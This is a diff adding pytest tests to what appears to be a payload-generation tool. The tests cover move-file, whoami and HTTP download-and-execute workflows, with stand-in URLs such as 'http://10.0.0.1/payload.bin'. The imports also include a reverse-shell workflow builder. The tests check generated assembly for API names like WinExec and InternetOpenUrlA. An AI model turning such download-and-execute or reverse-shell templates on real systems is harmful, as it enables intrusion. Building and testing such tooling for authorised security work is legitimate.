@@ -18,12 +18,18 @@ from emitrion.workflow.reference import (
     build_check_path_workflow,
     build_copy_file_workflow,
     build_copy_then_run_workflow,
+    build_get_username_workflow,
+    build_http_download_workflow,
+    build_move_file_workflow,
     build_move_then_run_workflow,
     build_reverse_shell_workflow,
     build_run_command_workflow,
     IRCheckPathTemplate,
     IRCopyFileTemplate,
     IRCopyThenRunTemplate,
+    IRGetUsernameTemplate,
+    IRHttpDownloadTemplate,
+    IRMoveFileTemplate,
     IRMoveThenRunTemplate,
 )
 
@@ -1109,3 +1115,249 @@ class TestExitStrategyAssembly:
         success_body = result.asm[success_start:fail_start]
         assert "jmp" in success_body
         assert "call" not in success_body
+
+
+# ---------------------------------------------------------------------------
+# Move file workflow (standalone)
+# ---------------------------------------------------------------------------
+
+
+class TestMoveFileWorkflow:
+    def test_workflow_is_valid(self):
+        from emitrion.workflow.validator import validate
+        w = build_move_file_workflow()
+        result = validate(w)
+        assert result.valid, result.errors
+
+    def test_workflow_has_three_blocks(self):
+        w = build_move_file_workflow()
+        assert len(w.blocks) == 3
+        names = {b.name for b in w.blocks}
+        assert names == {"entry", "success", "fail"}
+
+
+class TestMoveFileTemplate:
+    def test_probe_slots_finds_apis(self):
+        tmpl = IRMoveFileTemplate()
+        config = TemplateConfig(src_path=r"C:\a.txt", dst_path=r"C:\b.txt")
+        slots = tmpl.probe_slots(config)
+        assert "MoveFileA" in slots
+        assert "ExitProcess" in slots
+
+    def test_probe_slots_finds_strings(self):
+        tmpl = IRMoveFileTemplate()
+        config = TemplateConfig(src_path=r"C:\a.txt", dst_path=r"C:\b.txt")
+        slots = tmpl.probe_slots(config)
+        assert "src_path" in slots
+        assert "dst_path" in slots
+
+
+class TestMoveFileLowering:
+    @pytest.fixture
+    def lowered_asm(self, manifest_dir):
+        from emitrion.build import build
+        result = build(
+            str(manifest_dir / "move_file.yaml"),
+            template_name="ir_move_file",
+            out_dir="/dev/null",
+            assemble=False,
+        )
+        return result.asm
+
+    def test_contains_workflow_labels(self, lowered_asm):
+        assert "wf_entry:" in lowered_asm
+        assert "wf_success:" in lowered_asm
+        assert "wf_fail:" in lowered_asm
+
+    def test_contains_movefile_call(self, lowered_asm):
+        assert "MoveFileA" in lowered_asm
+
+    def test_contains_exit_process(self, lowered_asm):
+        assert "ExitProcess" in lowered_asm
+
+    def test_no_winexec(self, lowered_asm):
+        assert "WinExec" not in lowered_asm
+
+
+class TestMoveFileEndToEnd:
+    def test_build_produces_assembly(self, manifest_dir, tmp_path, monkeypatch):
+        from emitrion.build import build
+        monkeypatch.setenv("SOURCE_DATE_EPOCH", "0")
+        result = build(
+            str(manifest_dir / "move_file.yaml"),
+            template_name="ir_move_file",
+            out_dir=str(tmp_path),
+            assemble=False,
+        )
+        assert result.asm
+        assert result.contract_md
+
+
+# ---------------------------------------------------------------------------
+# Get username workflow
+# ---------------------------------------------------------------------------
+
+
+class TestGetUsernameWorkflow:
+    def test_workflow_is_valid(self):
+        from emitrion.workflow.validator import validate
+        w = build_get_username_workflow()
+        result = validate(w)
+        assert result.valid, result.errors
+
+    def test_workflow_has_four_blocks(self):
+        w = build_get_username_workflow()
+        assert len(w.blocks) == 4
+        names = {b.name for b in w.blocks}
+        assert names == {"entry", "run_command", "success", "fail"}
+
+
+class TestGetUsernameTemplate:
+    def test_probe_slots_finds_apis(self):
+        tmpl = IRGetUsernameTemplate()
+        config = TemplateConfig(command="whoami")
+        slots = tmpl.probe_slots(config)
+        assert "GetUserNameA" in slots
+        assert "LoadLibraryA" in slots
+        assert "WinExec" in slots
+
+    def test_probe_slots_finds_structs(self):
+        tmpl = IRGetUsernameTemplate()
+        config = TemplateConfig()
+        structs = tmpl.probe_structs(config)
+        assert "username_buf" in structs
+        assert structs["username_buf"] == "CHAR_BUFFER_128"
+
+
+class TestGetUsernameLowering:
+    @pytest.fixture
+    def lowered_asm(self, manifest_dir):
+        from emitrion.build import build
+        result = build(
+            str(manifest_dir / "get_username.yaml"),
+            template_name="ir_get_username",
+            out_dir="/dev/null",
+            assemble=False,
+        )
+        return result.asm
+
+    def test_contains_workflow_labels(self, lowered_asm):
+        assert "wf_entry:" in lowered_asm
+        assert "wf_run_command:" in lowered_asm
+
+    def test_contains_getusername_call(self, lowered_asm):
+        assert "GetUserNameA" in lowered_asm
+
+    def test_contains_loadlibrary_for_advapi(self, lowered_asm):
+        assert "advapi32.dll" in lowered_asm
+        assert "LoadLibraryA" in lowered_asm
+
+    def test_contains_store_local(self, lowered_asm):
+        assert "username_len" in lowered_asm
+
+
+class TestGetUsernameEndToEnd:
+    def test_build_produces_assembly(self, manifest_dir, tmp_path, monkeypatch):
+        from emitrion.build import build
+        monkeypatch.setenv("SOURCE_DATE_EPOCH", "0")
+        result = build(
+            str(manifest_dir / "get_username.yaml"),
+            template_name="ir_get_username",
+            out_dir=str(tmp_path),
+            assemble=False,
+        )
+        assert result.asm
+        assert result.contract_md
+
+
+# ---------------------------------------------------------------------------
+# HTTP download workflow
+# ---------------------------------------------------------------------------
+
+
+class TestHttpDownloadWorkflow:
+    def test_workflow_is_valid(self):
+        from emitrion.workflow.validator import validate
+        w = build_http_download_workflow()
+        result = validate(w)
+        assert result.valid, result.errors
+
+    def test_workflow_block_count(self):
+        w = build_http_download_workflow()
+        names = {b.name for b in w.blocks}
+        assert "entry" in names
+        assert "open_url" in names
+        assert "alloc_buffer" in names
+        assert "read_loop" in names
+        assert "close_handles" in names
+        assert "write_file" in names
+        assert "do_write" in names
+        assert "exec_payload" in names
+
+
+class TestHttpDownloadTemplate:
+    def test_probe_slots_finds_apis(self):
+        tmpl = IRHttpDownloadTemplate()
+        config = TemplateConfig(url="http://10.0.0.1/test.exe")
+        slots = tmpl.probe_slots(config)
+        assert "InternetOpenA" in slots
+        assert "InternetOpenUrlA" in slots
+        assert "InternetReadFile" in slots
+        assert "InternetCloseHandle" in slots
+        assert "VirtualAlloc" in slots
+        assert "CreateFileA" in slots
+        assert "WriteFile" in slots
+        assert "WinExec" in slots
+
+    def test_probe_strings_finds_url(self):
+        tmpl = IRHttpDownloadTemplate()
+        config = TemplateConfig(url="http://10.0.0.1/payload.bin")
+        strings = tmpl.probe_strings(config)
+        assert "url" in strings
+        assert strings["url"] == "http://10.0.0.1/payload.bin"
+
+
+class TestHttpDownloadLowering:
+    @pytest.fixture
+    def lowered_asm(self, manifest_dir):
+        from emitrion.build import build
+        result = build(
+            str(manifest_dir / "http_download.yaml"),
+            template_name="ir_http_download",
+            out_dir="/dev/null",
+            assemble=False,
+        )
+        return result.asm
+
+    def test_contains_workflow_labels(self, lowered_asm):
+        assert "wf_entry:" in lowered_asm
+        assert "wf_open_url:" in lowered_asm
+        assert "wf_read_loop:" in lowered_asm
+        assert "wf_write_file:" in lowered_asm
+
+    def test_contains_wininet_calls(self, lowered_asm):
+        assert "InternetOpenA" in lowered_asm
+        assert "InternetOpenUrlA" in lowered_asm
+        assert "InternetReadFile" in lowered_asm
+
+    def test_contains_file_write(self, lowered_asm):
+        assert "CreateFileA" in lowered_asm
+        assert "WriteFile" in lowered_asm
+
+    def test_contains_winexec(self, lowered_asm):
+        assert "WinExec" in lowered_asm
+
+
+class TestHttpDownloadEndToEnd:
+    def test_build_produces_assembly(self, manifest_dir, tmp_path, monkeypatch):
+        from emitrion.build import build
+        monkeypatch.setenv("SOURCE_DATE_EPOCH", "0")
+        result = build(
+            str(manifest_dir / "http_download.yaml"),
+            template_name="ir_http_download",
+            out_dir=str(tmp_path),
+            assemble=False,
+        )
+        assert result.asm
+        assert result.contract_md
+        assert "wininet.dll" in result.asm
